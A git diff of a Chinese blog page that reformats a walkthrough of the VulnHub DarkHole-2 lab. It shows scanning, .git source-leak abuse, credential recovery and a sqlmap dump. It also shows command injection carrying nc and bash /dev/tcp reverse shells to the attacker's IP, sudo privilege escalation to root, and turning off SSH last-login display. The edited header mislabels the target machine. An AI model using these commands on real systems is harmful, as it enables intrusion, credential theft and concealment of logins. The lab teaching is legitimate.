@@ -76,7 +76,7 @@ Phut Hon = X_T = 天行健，君子以自强不息</title>
       <i class="ic i-pen"></i>
     </span>
     <span class="text">本文字数</span>
-    <span>5.5k</span>
+    <span>5.4k</span>
     <span class="text">字</span>
   </span>
   <span class="item" title="阅读时长">
@@ -117,12 +117,12 @@ Phut Hon = X_T = 天行健，君子以自强不息</title>
       </div>
       <div id="imgs" class="pjax">
         <ul>
-          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/mg3v58QxFb7tICZ.jpg"></li>
-          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/IN5LOBHrAwVsnC4.jpg"></li>
-          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/eZcPaFH4pt9Cx8k.jpg"></li>
-          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/dwNFSq4OhisgMJn.jpg"></li>
-          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/sAogJHmbkhVBX4D.jpg"></li>
-          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/PnZSqOMvKfaL2hl.jpg"></li>
+          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/iw5hEbpoS7DKcve.jpg"></li>
+          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/cbz8yrGvMghk3FY.jpg"></li>
+          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/BId2kKHmufXsrnl.jpg"></li>
+          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/BCMkIXvxWUj69pG.jpg"></li>
+          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/VfOmDtw751FRCXl.jpg"></li>
+          <li class="item" data-background-image="https://s2.loli.net/2023/04/01/S4bepoyLPicVCx5.jpg"></li>
         </ul>
       </div>
     </header>
@@ -170,26 +170,24 @@ Phut Hon = X_T = 天行健，君子以自强不息</title>
 
     <p>靶机下载地址: <span class="exturl" data-url="aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvZGFya2hvbGUtMiw3NDAv">https://www.vulnhub.com/entry/darkhole-2,740/</span><br>
  教程链接地址: <span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vd2RkLWJsb2cvcC8xNTIzMDgyNi5odG1s">https://www.cnblogs.com/wdd-blog/p/15230826.html</span></p>
-<h3 id="001-确认攻击目标的财产信息"><a class="markdownIt-Anchor" href="#001-确认攻击目标的财产信息">#</a> 001 确认攻击目标的财产信息</h3>
-<p>攻击机 kali： 1 92.168.31.xx (由于设置成了 DHCP、可能多变)<br>
- 靶机 CENGBOX 3 ：桥接于 1 92.168.31.1 的网卡，ip 未知</p>
-<p>1 ）确定靶机 ip 地址和开放的端口<br>
-由已至内网靶机所在主机 MAC 地址自动扫描靶机服务<br>
- sudo arp-scan -l | grep ‘a0’ | awk ‘{print $1,$2}’ | cut -d ’ ’ -f 1 | xargs sudo nmap -PA</p>
+<h3 id="确认攻击目标"><a class="markdownIt-Anchor" href="#确认攻击目标">#</a> 确认攻击目标</h3>
+<p>攻击机 KALI： 192.168.31.135 (由于设置成了 DHCP、可能多变)<br>
+ 靶机 SNAKEOIL：桥接于 192.168.31.1 的网卡，ip 未知</p>
+<p>1) 确定靶机 ip 地址和开放的端口</p>
+<p>由已至内网靶机所在主机 MAC 地址自动扫描靶机服务<br>
+ <code>sudo arp-scan -l | grep 'a0' | awk '&#123;print $1,$2&#125;' | cut -d ' ' -f 1 | xargs sudo nmap -PA</code></p>
 <p><img data-src="/N1h1l157/VULNHUB/image-1192.png" alt></p>
-<h3 id="再次对其开放的端口进行详细的扫描"><a class="markdownIt-Anchor" href="#再次对其开放的端口进行详细的扫描">#</a> 再次对其开放的端口进行详细的扫描</h3>
-<p>sudo nmap -A -p- 192.168.31.12 --min-rate=5000</p>
+<p>2) 再次对其开放的端口进行详细的扫描</p>
+<p><code>sudo nmap -A -p- 192.168.31.12 --min-rate=5000</code></p>
 <p><img data-src="/N1h1l157/VULNHUB/image-1193.png" alt></p>
-<p>à 靶机 ip：192.168.31. 12 、靶机开放端口 22 , 80<br>
- 并且扫描到了再 80 端口上是存在 git 源码泄漏的</p>
-<h3 id="002-信息收集git源码泄漏利用git-log切换git分支"><a class="markdownIt-Anchor" href="#002-信息收集git源码泄漏利用git-log切换git分支">#</a> 002 信息收集，.git 源码泄漏利用，git log 切换 git 分支</h3>
-<p>打开 <span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMzEu">http://192.168.31.</span> 12 / 进行信息收集</p>
+<p>-&gt; 靶机 ip：192.168.31. 12 、靶机开放端口 22,80</p>
+<p>-&gt; 并且扫描到了再 80 端口上是存在 git 源码泄漏的</p>
+<h3 id="网站信息收集"><a class="markdownIt-Anchor" href="#网站信息收集">#</a> 网站信息收集</h3>
+<p>打开 <span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMzEuMTI=">http://192.168.31.12</span> 进行信息收集</p>
 <p><img data-src="/N1h1l157/VULNHUB/image-1194.png" alt></p>
-<p>目测是没有什么有价值的信息，直接开始用 gobuster 扫描目录<br>
- gobuster dir -x php,txt,html,zip,rar,jpg,png -w /usr/share/wordlists/dirbuster/directory-<br>
-list-2.3-medium.txt -u <span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMzEu">http://192.168.31.</span> 12</p>
+<p>扫描目录  <code>gobuster dir -x php,txt,html,zip,rar,jpg,png -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.31.12</code></p>
 <p><img data-src="/N1h1l157/VULNHUB/image-1195.png" alt></p>
-<h3 id="依次对得到的目录信息进行访问搜索有价值的信息"><a class="markdownIt-Anchor" href="#依次对得到的目录信息进行访问搜索有价值的信息">#</a> 依次对得到的目录信息进行访问搜索有价值的信息</h3>
+<p>依次对得到的目录信息进行访问搜索有价值的信息</p>
 <p><span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMzEuMTIvbG9naW4ucGhw">http://192.168.31.12/login.php</span></p>
 <p><img data-src="/N1h1l157/VULNHUB/image-1196.png" alt></p>
 <p><span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMzEuMTIvZGFzaGJvYXJkLnBocA==">http://192.168.31.12/dashboard.php</span></p>
@@ -198,191 +196,170 @@ list-2.3-medium.txt -u <span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMzEu">
 <p><img data-src="/N1h1l157/VULNHUB/image-1198.png" alt></p>
 <p><span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMzEuMTIvY29uZmlnL2NvbmZpZy5waHA=">http://192.168.31.12/config/config.php</span></p>
 <p><img data-src="/N1h1l157/VULNHUB/image-1199.png" alt></p>
-<p>通过对上述几个目录的信息收集，只能确定一个后台的登陆地址 login.php，<br>
-和一个不被允许进入的 dashboard.php 两个信息</p>
+<p>通过对上述几个目录的信息收集，只能确定一个后台的登陆地址 login.php，和一个不被允许进入的 dashboard.php 两个信息</p>
+<h3 id="git源码泄漏利用"><a class="markdownIt-Anchor" href="#git源码泄漏利用">#</a> .git 源码泄漏利用</h3>
 <p>在端口扫描阶段因为有.git 的信息，对.git 进行访问<br>
 <span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMzEuMTIvLmdpdC8="> http://192.168.31.12/.git/</span></p>
 <p><img data-src="/N1h1l157/VULNHUB/image-1200.png" alt></p>
 <p>利用 githack 对源码泄漏进行利用</p>
 <p><img data-src="/N1h1l157/VULNHUB/image-1201.png" alt></p>
-<p>wget <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2xpamllamllL0dpdEhhY2svYXJjaGl2ZS9yZWZzL2hlYWRzL21hc3Rlci56aXA=">https://github.com/lijiejie/GitHack/archive/refs/heads/master.zip</span> - O Githack.zip</p>
-<ul>
-<li>q;unzip -q Githack.zip;cd GitHack-master;<br>
-python3 <span class="exturl" data-url="aHR0cDovL0dpdEhhY2sucHk=">GitHack.py</span> <span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMzEuMTIvLmdpdA==">http://192.168.31.12/.git</span></li>
-</ul>
+<p><code>wget https://github.com/lijiejie/GitHack/archive/refs/heads/master.zip -O Githack.zip -q;unzip -q Githack.zip;cd GitHack-master;</code> <br>
+ <code>python3 GitHack.py http://192.168.31.12/.git</code></p>
 <p><img data-src="/N1h1l157/VULNHUB/image-1202.png" alt></p>
 <p>通过.git 文件可以得到此项目的源码</p>
 <p><img data-src="/N1h1l157/VULNHUB/image-1203.png" alt></p>
 <p>源码中有 config 是敏感文件，进行读取</p>
 <p><img data-src="/N1h1l157/VULNHUB/image-1204.png" alt></p>
-<p>得到了数据的账户密码 root:darkhole_2</p>
-<p>但是通过 githack 的方式读取到的源码没有记录之前的 git 版本，没法使用 git 命<br>
-令去获取到之前提交的版本，除了 githack 的利用方式之外还可以用如下方式<br>
- TF=$(mktemp -d); cd $TF;wget -r <span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMzEuMTIvLmdpdC8=">http://192.168.31.12/.git/</span> - q;cd $TF/192.168.31.12<br>
-&amp;&amp; git clone. webapp &amp;&amp; cd webapp</p>
+<p>得到了数据的账户密码  <code>root:darkhole_2</code></p>
+<p>但是通过 githack 的方式读取到的源码没有记录之前的 git 版本，没法使用 git 命令去获取到之前提交的版本</p>
+<h3 id="git-log切换git分支"><a class="markdownIt-Anchor" href="#git-log切换git分支">#</a> git log 切换 git 分支</h3>
+<p>除了 githack 的利用方式之外还可以用如下方式</p>
+<p><code>TF=$(mktemp -d); cd $TF;wget -r http://192.168.31.12/.git/ -q; cd $TF/192.168.31.12 &amp;&amp; git clone. webapp &amp;&amp; cd webapp</code></p>
 <p><img data-src="/N1h1l157/VULNHUB/image-1205.png" alt></p>
 <p>通过这种方式可以得到.git 文件，执行 git 的相关命令</p>
-<p>git log 查看之前提交的版本<br>
-看到有一次提交信息是涉及到 login.php 的，切换到该分支查看<br>
- git reset --hard a4d900a8d85e8938d3601f3cef113ee293028e10</p>
+<p><code>git log</code>  查看之前提交的版本，看到有一次提交信息是涉及到 login.php 的，切换到该分支查看<br>
+ <code>git reset --hard a4d900a8d85e8938d3601f3cef113ee293028e10</code></p>
 <p><img data-src="/N1h1l157/VULNHUB/image-1206.png" alt></p>
-<p>在 login.php 内容中看到了用户名和密码 lush@admin.com:321</p>
+<p>在 login.php 内容中看到了用户名和密码 <code>lush@admin.com:321</code></p>
 <p><img data-src="/N1h1l157/VULNHUB/image-1207.png" alt></p>
-<h3 id="003-sql注入拿数据-sqlmap一把梭-敏感端口查看"><a class="markdownIt-Anchor" href="#003-sql注入拿数据-sqlmap一把梭-敏感端口查看">#</a> 003 sql 注入拿数据、sqlmap 一把梭、敏感端口查看</h3>
-<h3 id="通过得到的用户名和密码进入到了对方后台管理中心"><a class="markdownIt-Anchor" href="#通过得到的用户名和密码进入到了对方后台管理中心">#</a> 通过得到的用户名和密码进入到了对方后台管理中心</h3>
+<h3 id="sqlmap一把梭"><a class="markdownIt-Anchor" href="#sqlmap一把梭">#</a> sqlmap 一把梭</h3>
+<p>通过得到的用户名和密码进入到了对方后台管理中心</p>
 <p><img data-src="/N1h1l157/VULNHUB/image-1208.png" alt></p>
-<p><span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMzEuOTQvZGFzaGJvYXJkLnBocD9pZD0x">http://192.168.31.94/dashboard.php?id=1</span><br>
- 观察 url 地址，似乎是存在 sql 注入的，通过 burp 截取数据包</p>
+<p>观察 url 地址 <span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMzEuOTQvZGFzaGJvYXJkLnBocD9pZD0x">http://192.168.31.94/dashboard.php?id=1</span></p>
+<p>似乎是存在 sql 注入的，通过 burp 截取数据包</p>
 <p><img data-src="/N1h1l157/VULNHUB/image-1209.png" alt></p>
-<p>sqlmap -r 1.txt --dbs --batch</p>
+<p><code>sqlmap -r 1.txt --dbs --batch</code></p>
 <p><img data-src="/N1h1l157/VULNHUB/image-1210.png" alt></p>
 <p>跑出来了数据库的名字 darkhole_2，继续测试数据库中有哪些表<br>
- sqlmap -r 1.txt --dbs --batch - D darkhole_2 --tables</p>
+ <code>sqlmap -r 1.txt --dbs --batch - D darkhole_2 --tables</code></p>
 <p><img data-src="/N1h1l157/VULNHUB/image-1211.png" alt></p>
 <p>得到两张表，选取 ssh 表去查看有哪些列<br>
- sqlmap -r 1.txt --dbs --batch - D darkhole_2 -T ssh --columns</p>
+ <code>sqlmap -r 1.txt --dbs --batch - D darkhole_2 -T ssh --columns</code></p>
 <p><img data-src="/N1h1l157/VULNHUB/image-1212.png" alt></p>
 <p>得到此表下的三个字段 user、id、pass<br>
-sqlmap -r 1.txt --batch -D darkhole_2 -T ssh -C user,id,pass --dump</p>
+ <code>sqlmap -r 1.txt --batch -D darkhole_2 -T ssh -C user,id,pass --dump</code></p>
 <p><img data-src="/N1h1l157/VULNHUB/image-1213.png" alt></p>
-<p>最终得到了数据库的用户名和密码 jehad:fool</p>
+<p>最终得到了数据库的用户名和密码 <code>jehad:fool</code></p>
 <p><img data-src="/N1h1l157/VULNHUB/image-1214.png" alt></p>
 <p>凭借凭据 jehad 拿到了靶机上一个普通用户的权限</p>
 <p><img data-src="/N1h1l157/VULNHUB/image-1215.png" alt></p>
-<p>但是这个 ssh 登陆成功之后显示的东西是比较多的，这么多的系统信息显示出<br>
-来是没必要的，而且会有 last login 可以看到最后登陆的 ip，这些信息也是可以<br>
-处理的，后面会对这个信息进行自定义</p>
 <p>查看靶机上有没有开放特殊的端口</p>
 <p><img data-src="/N1h1l157/VULNHUB/image-1216.png" alt></p>
-<h3 id="004-curl访问网站及命令注入-bash的base-64-反弹shell"><a class="markdownIt-Anchor" href="#004-curl访问网站及命令注入-bash的base-64-反弹shell">#</a> 004 curl 访问网站及命令注入、bash 的 base 64 反弹 shell</h3>
-<h3 id="发现在这台服务器上有-9999-端口正在运行但是此端口被防火墙关掉了我们"><a class="markdownIt-Anchor" href="#发现在这台服务器上有-9999-端口正在运行但是此端口被防火墙关掉了我们">#</a> 发现在这台服务器上有 9999 端口正在运行，但是此端口被防火墙关掉了，我们</h3>
-<p>在 kali 机器上无法访问此端口，可以做 ssh 端口转发将此端口映射到外面，当<br>
-然也可以通过 curl 命令在这台 linux 机器上直接访问此网站</p>
-<p>curl -vv 127.0.0.1:9999<br>
- 可以看到所提交的数据包以及返回的数据包，并且可以看到页面是采用的 php<br>
- 写的，返回了一个 cmd 的参数，很有可能是命令执行漏洞</p>
+<h3 id="curl-测试网站"><a class="markdownIt-Anchor" href="#curl-测试网站">#</a> curl 测试网站</h3>
+<blockquote>
+<p>发现在这台服务器上有 9999 端口正在运行，但是此端口被防火墙关掉了，我们在 kali 机器上无法访问此端口，可以做 ssh 端口转发将此端口映射到外面，当然也可以通过 curl 命令在这台 linux 机器上直接访问此网站</p>
+</blockquote>
+<p><code>curl -vv 127.0.0.1:9999</code></p>
 <p><img data-src="/N1h1l157/VULNHUB/image-1217.png" alt></p>
-<h3 id="执行系统命令看当前这个网站是属于哪个用户下的"><a class="markdownIt-Anchor" href="#执行系统命令看当前这个网站是属于哪个用户下的">#</a> 执行系统命令，看当前这个网站是属于哪个用户下的</h3>
-<p>curl 127.0.0.1:9999?cmd=id;echo ’ ’<br>
-echo ’ ' 的作用使回显比较美观一些，没有实际的作用<br>
+<p>可以看到所提交的数据包以及返回的数据包，并且可以看到页面是采用的 php 写的，返回了一个 cmd 的参数，很有可能是命令执行漏洞；执行系统命令，看当前这个网站是属于哪个用户下的</p>
+<blockquote>
+<p><code>curl 127.0.0.1:9999?cmd=id;echo ''</code> <br>
+ <code>echo ''</code>  的作用使回显比较美观一些，没有实际的作用<br>
 得到了此网站是由用户 losy 的权限搞的，现在需要把 losy 用户的 shell 反弹<br>
 判断 losy 是否可以使用 nc 命令反弹 shell<br>
-curl 127.0.0.1:9999?cmd=which%20nc;echo ’ ’</p>
+ <code>curl 127.0.0.1:9999?cmd=which%20nc;echo ''</code></p>
+</blockquote>
 <p><img data-src="/N1h1l157/VULNHUB/image-1218.png" alt></p>
 <p>使用 nc 反弹 shell，并在 kali 上进行监听<br>
- curl 127.0.0.1:9999?cmd=nc%20192.168.31.99%204444%20-e%20/bin/bash;echo ‘’</p>
+ <code>curl 127.0.0.1:9999?cmd=nc%20192.168.31.99%204444%20-e%20/bin/bash;echo ''</code></p>
 <p><img data-src="/N1h1l157/VULNHUB/image-1219.png" alt></p>
-<p>反弹失败了，有可能是因为被禁用了 nc、也有可能是未采用 base 64 编码，需要<br>
-都进行尝试一番，使用 bash 反弹 shell 时的命令执行成功了</p>
-<p>curl 127.0.0.1:9999/?cmd=bash%20-c%20%27bash%20-<br>
-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.31.99%2F4444%200%3E%261%27<br>
- 采用的命令即是：bash -c ‘bash -i &gt;&amp; /dev/tcp/192.168.31. 99 /4444 0&gt;&amp;1’</p>
+<p>反弹失败了，有可能是因为被禁用了 nc、也有可能是未采用 base 64 编码，需要都进行尝试一番，使用 bash 反弹 shell 时的命令执行成功了</p>
+<p><code>curl 127.0.0.1:9999/?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.31.99%2F4444%200%3E%261%27</code> <br>
+ 采用的命令即是： <code>bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.31. 99 /4444 0&gt;&amp;1'</code></p>
 <p><img data-src="/N1h1l157/VULNHUB/image-1220.png" alt></p>
-<p>调整为一个标准的 tty 终端<br>
- python3 -c “import pty;pty.spawn (’/bin/bash’)”<br>
-python3 -c “<strong>import</strong>(‘pty’).spawn(’/bin/bash’)”<br>
-stty -a<br>
-stty raw -echo;fg</p>
+<h3 id="调整为标准终端"><a class="markdownIt-Anchor" href="#调整为标准终端">#</a> 调整为标准终端</h3>
+<p>调整为一个标准的 tty 终端</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br><span class="line">python3 -c &quot;__import__(&#x27;pty&#x27;).spawn(&#x27;/bin/bash&#x27;)&quot;</span><br><span class="line">stty -a</span><br><span class="line">stty raw -echo;fg</span><br></pre></td></tr></table></figure>
 <p><img data-src="/N1h1l157/VULNHUB/image-1221.png" alt></p>
-<p>调整 TERM、stty 的窗口大小<br>
- export TERM=xterm<br>
-stty rows 31 columns 118</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">调整TERM、<span class="built_in">stty</span>的窗口大小</span></span><br><span class="line">export TERM=xterm</span><br><span class="line">stty rows 31 columns 118</span><br></pre></td></tr></table></figure>
 <p><img data-src="/N1h1l157/VULNHUB/image-1222.png" alt></p>
 <p>此刻的我们已经拿到了 losy 用户的 shell</p>
-<h3 id="005-pspy监控-历史遗留信息-权限错误提权"><a class="markdownIt-Anchor" href="#005-pspy监控-历史遗留信息-权限错误提权">#</a> 005 pspy 监控、历史遗留信息、权限错误提权</h3>
+<h3 id="历史遗留信息"><a class="markdownIt-Anchor" href="#历史遗留信息">#</a> 历史遗留信息</h3>
 <p>在 kali 上给靶机传输一个 pspy 看看有没有敏感任务被执行</p>
 <p><img data-src="/N1h1l157/VULNHUB/image-1223.png" alt></p>
 <p>看到在 /opt/web 下有一个 php 启动本地 9999 端口的命令</p>
 <p><img data-src="/N1h1l157/VULNHUB/image-1224.png" alt></p>
-<h3 id="由此造成了-9999-端口处的命令执行漏洞"><a class="markdownIt-Anchor" href="#由此造成了-9999-端口处的命令执行漏洞">#</a> 由此造成了 9999 端口处的命令执行漏洞</h3>
+<p>由此造成了 9999 端口处的命令执行漏洞</p>
 <p><img data-src="/N1h1l157/VULNHUB/image-1225.png" alt></p>
-<p>到处查看文件，找到了在 bash_history 里边的敏感记录，当中有一个密码<br>
-发现这个密码不是 root 用户的，只是 losy 用户的，这个密码也可以爆破得到</p>
+<p>到处查看文件，找到了在 bash_history 里边的敏感记录，当中有一个密码，发现这个密码不是 root 用户的，只是 losy 用户的，这个密码也可以爆破得到</p>
 <p><img data-src="/N1h1l157/VULNHUB/image-1226.png" alt></p>
-<p>通过 sudo - l 查到了一条隐私设置错误的记录<br>
- sudo -u root python3 -c “<strong>import</strong>(‘os’).system(’/bin/bash’)”</p>
+<p>通过 <code>sudo -l</code>  查到了一条隐私设置错误的记录<br>
+ `sudo -u root python3 -c “<strong>import</strong>(‘os’).system(’/bin/bash’)”``</p>
 <p><img data-src="/N1h1l157/VULNHUB/image-1227.png" alt></p>
-<p><strong>提权成功拿到了 root 权限</strong></p>
-<h3 id="006-ssh登陆显示信息-登陆前后及系统信息-lastlogin信息"><a class="markdownIt-Anchor" href="#006-ssh登陆显示信息-登陆前后及系统信息-lastlogin信息">#</a> 006 ssh 登陆显示信息、登陆前后及系统信息、lastlogin 信息</h3>
-<p>对于 ssh 登陆之后有大量的系统信息展示出来，这在我们看来是完全没有必要<br>
-的，而且占用了大量的屏幕不太友好，接下来就自定义 ssh 登陆后的信息</p>
+<p>-&gt; 提权成功拿到了 root 权限</p>
+<h3 id="ssh-显示系统信息"><a class="markdownIt-Anchor" href="#ssh-显示系统信息">#</a> ssh 显示系统信息</h3>
+<p>对于 ssh 登陆之后有大量的系统信息展示出来，这在我们看来是完全没有必要的，而且占用了大量的屏幕不太友好，接下来就自定义 ssh 登陆后的信息</p>
 <p><img data-src="/N1h1l157/VULNHUB/image-1228.png" alt></p>
-<h3 id="这是默认显示的信息分了两部分上面的是打印的系统信息下面的是最后"><a class="markdownIt-Anchor" href="#这是默认显示的信息分了两部分上面的是打印的系统信息下面的是最后">#</a> 这是默认显示的信息，分了两部分，上面的是打印的系统信息，下面的是最后</h3>
-<p>登陆到此服务器的时间和 ip</p>
+<p>这是默认显示的信息，分了两部分，上面的是打印的系统信息，下面的是最后登陆到此服务器的时间和 ip</p>
 <p>上边的信息来自来自 /run/motd.dynamic 文件</p>
 <p><img data-src="/N1h1l157/VULNHUB/image-1229.png" alt></p>
-<h3 id="这个文件的信息无法修改哪怕被清空了也会复原"><a class="markdownIt-Anchor" href="#这个文件的信息无法修改哪怕被清空了也会复原">#</a> 这个文件的信息无法修改，哪怕被清空了也会复原。</h3>
+<p>这个文件的信息无法修改，哪怕被清空了也会复原。</p>
 <p><img data-src="/N1h1l157/VULNHUB/image-1230.png" alt></p>
-<p>它是由 /etc/update-motd.d/ 下的几个脚本文件来动态生成的。将 /etc/update-<br>
-motd.d/ 下的脚本移除或者去掉可执行权限可将此动态生成的系统信息去掉。<br>
-chmod -x /etc/update-motd.d/*;echo &gt; /run/motd.dynamic;</p>
+<blockquote>
+<p>它是由 /etc/update-motd.d/ 下的几个脚本文件来动态生成的。将 /etc/update-motd.d/ 下的脚本移除或者去掉可执行权限可将此动态生成的系统信息去掉。<br>
+ <code>chmod -x /etc/update-motd.d/*;echo &gt; /run/motd.dynamic;</code></p>
+</blockquote>
 <p><img data-src="/N1h1l157/VULNHUB/image-1231.png" alt></p>
-<h3 id="反之赋予这个文件夹所有文件可执行权限之后可以显示出系统信息"><a class="markdownIt-Anchor" href="#反之赋予这个文件夹所有文件可执行权限之后可以显示出系统信息">#</a> 反之，赋予这个文件夹所有文件可执行权限之后，可以显示出系统信息</h3>
-<p>开启 linux 系统信息展示：chmod +x /etc/update-motd.d/*</p>
-<p>下面的这条显示最后登陆信息是由 ssh 控制，ssh 默认是开启此记录的，可修<br>
-改 ssh 的配置文件，令其消失不见，关闭最后登陆的日志命令如下：<br>
-sed -i ‘s/#PrintLastLog yes/PrintLastLog no/g’ /etc/ssh/sshd_config;systemctl restart<br>
-sshd</p>
+<blockquote>
+<p>反之，赋予这个文件夹所有文件可执行权限之后，可以显示出系统信息开启 linux 系统信息展示： <code>chmod +x /etc/update-motd.d/*</code></p>
+</blockquote>
+<h3 id="ssh-最后登录ip"><a class="markdownIt-Anchor" href="#ssh-最后登录ip">#</a> ssh 最后登录 ip</h3>
+<blockquote>
+<p>下面的这条显示最后登陆信息是由 ssh 控制，ssh 默认是开启此记录的，可修改 ssh 的配置文件，令其消失不见，关闭最后登陆的日志命令如下：<br>
+ <code>sed -i 's/#PrintLastLog yes/PrintLastLog no/g' /etc/ssh/sshd_config;systemctl restart sshd</code></p>
+</blockquote>
 <p><img data-src="/N1h1l157/VULNHUB/image-1232.png" alt></p>
-<h3 id="最后登陆的消息一般来说比较重要可以方便的看到自己的机器是否有异地登"><a class="markdownIt-Anchor" href="#最后登陆的消息一般来说比较重要可以方便的看到自己的机器是否有异地登">#</a> 最后登陆的消息一般来说比较重要，可以方便的看到自己的机器是否有异地登</h3>
+<p>最后登陆的消息一般来说比较重要，可以方便的看到自己的机器是否有异地登陆的情况出现，开启最后登陆的日志命令如下：</p>
 <p><img data-src="/N1h1l157/VULNHUB/image-1233.png" alt></p>
-<h3 id="陆的情况出现开启最后登陆的日志命令如下"><a class="markdownIt-Anchor" href="#陆的情况出现开启最后登陆的日志命令如下">#</a> 陆的情况出现，开启最后登陆的日志命令如下：</h3>
-<p>很多时候我们需要自定义一些登陆后的 logo 展示，可以选在登陆前或者登陆后<br>
-显示一些 logo，而 /etc/motd 的作用就是用来登陆之后会显示的内容，可在<br>
-<span class="exturl" data-url="aHR0cHM6Ly93d3cuYm9vdHNjaG9vbC5uZXQvYXNjaWklRTQlQjglOEElRTglQkYlOUIlRTglQTElOEMlRTUlQUQlOTclRTYlQUYlOEQlRTclOUElODQlRTUlOUIlQkUlRTUlQkQlQTIlRTclQkMlOTYlRTclQTAlODE="> https://www.bootschool.net/ascii 上进行字母的图形编码</span><br>
+<h3 id="ssh-登录时logo"><a class="markdownIt-Anchor" href="#ssh-登录时logo">#</a> ssh 登录时 logo</h3>
+<blockquote>
+<p>很多时候我们需要自定义一些登陆后的 logo 展示，可以选在登陆前或者登陆后显示一些 logo，而 /etc/motd 的作用就是用来登陆之后会显示的内容，可在 <span class="exturl" data-url="aHR0cHM6Ly93d3cuYm9vdHNjaG9vbC5uZXQvYXNjaWklRTQlQjglOEElRTglQkYlOUIlRTglQTElOEMlRTUlQUQlOTclRTYlQUYlOEQlRTclOUElODQlRTUlOUIlQkUlRTUlQkQlQTIlRTclQkMlOTYlRTclQTAlODE=">https://www.bootschool.net/ascii 上进行字母的图形编码</span><br>
 开启 linux 登陆 logo 提示：<br>
-echo -e ‘\n\n\t\t██╗ ██╗ ████████╗\n\t\t╚██╗██╔╝<br>
-╚══██╔══╝\n\t\t ╚███╔╝ ██║ \n\t\t ██╔██<br>
-╗ ██║ \n\t\t██╔╝ ██╗███████╗██║ \n\t\t<br>
-╚═╝ ╚═╝╚══════╝╚═╝\n’ &gt; /etc/motd</p>
-<ul>
-<li>e 表示开启转义 \n 表示换行 \t 表示 tab 按键</li>
-</ul>
+ <code>echo -e '\n\n\t\t██╗ ██╗ ████████╗\n\t\t╚██╗██╔╝ ╚══██╔══╝\n\t\t ╚███╔╝ ██║ \n\t\t ██╔██ ╗ ██║ \n\t\t██╔╝ ██╗███████╗██║ \n\t\t ╚═╝ ╚═╝╚══════╝╚═╝\n' &gt; /etc/motd</code> <br>
+-e 表示开启转义 \n 表示换行 \t 表示 tab 按键</p>
+</blockquote>
 <p><img data-src="/N1h1l157/VULNHUB/image-1234.png" alt></p>
+<blockquote>
 <p>关闭这个 logo 提示，只需要将 /etc/motd 清空就可以<br>
- echo &gt; /etc/motd;vim /etc/motd +&quot;d 1&quot; +wq 会有一个空格<br>
- cat /dev/null &gt; /etc/motd 没有任何东西，直接清空文件</p>
+ <code>echo &gt; /etc/motd;vim /etc/motd +&quot;d 1 &quot; +wq</code>  会有一个空格<br>
+ <code>cat /dev/null &gt; /etc/motd</code>  没有任何东西，直接清空文件</p>
+</blockquote>
 <p><img data-src="/N1h1l157/VULNHUB/image-1235.png" alt></p>
-<p>上述命令是用来展示或者不展示在 linux 登陆之后的 logo，还有一种方式是用<br>
-来添加在 linux 登陆之前就来展示的 logo，使用 /etc/issue.net 来控制<br>
- sed -i ‘s/#Banner none/Banner/etc/issue.net/g’ /etc/ssh/sshd_config;systemctl restart<br>
-sshd; echo -e ‘\n\t\t███████╗██╗ ██╗██╗ ██╗\n\t\t╚══███╔╝╚██╗<br>
-██╔╝██║ ██║\n\t\t ███╔╝ ╚████╔╝ ███████║\n\t\t ███╔╝<br>
-╚██╔╝ ██╔══██║\n\t\t███████╗ ██║ ██║<br>
-██║\n\t\t╚══════╝ ╚═╝ ╚═╝ ╚═╝’ &gt; /etc/issue.net</p>
+<blockquote>
+<p>上述命令是用来展示或者不展示在 linux 登陆之后的 logo，还有一种方式是用来添加在 linux 登陆之前就来展示的 logo，使用 /etc/issue.net 来控制<br>
+ <code>sed -i 's/#Banner none/Banner \/etc\/issue.net/g' /etc/ssh/sshd_config;systemctl restart sshd; echo -e '\n\t\t███████╗██╗ ██╗██╗ ██╗\n\t\t╚══███╔╝╚██╗ ██╔╝██║ ██║\n\t\t ███╔╝ ╚████╔╝ ███████║\n\t\t ███╔╝ ╚██╔╝ ██╔══██║\n\t\t███████╗ ██║ ██║ ██║\n\t\t╚══════╝ ╚═╝ ╚═╝ ╚═╝' &gt; /etc/issue.net</code></p>
+</blockquote>
 <p><img data-src="/N1h1l157/VULNHUB/image-1236.png" alt></p>
-<p>可以看到这条 logo 信息是在我们输入 root 密码之前就显示出来的，是在登陆<br>
-前显示的，/etc/issue.net 的作用就是登陆前显示信息</p>
-<p>将登陆后的信息也显示一下进行对比就更容易理解<br>
-执行前面的命令，给 /etc/motd 重新打印出来了 X_T 的样式</p>
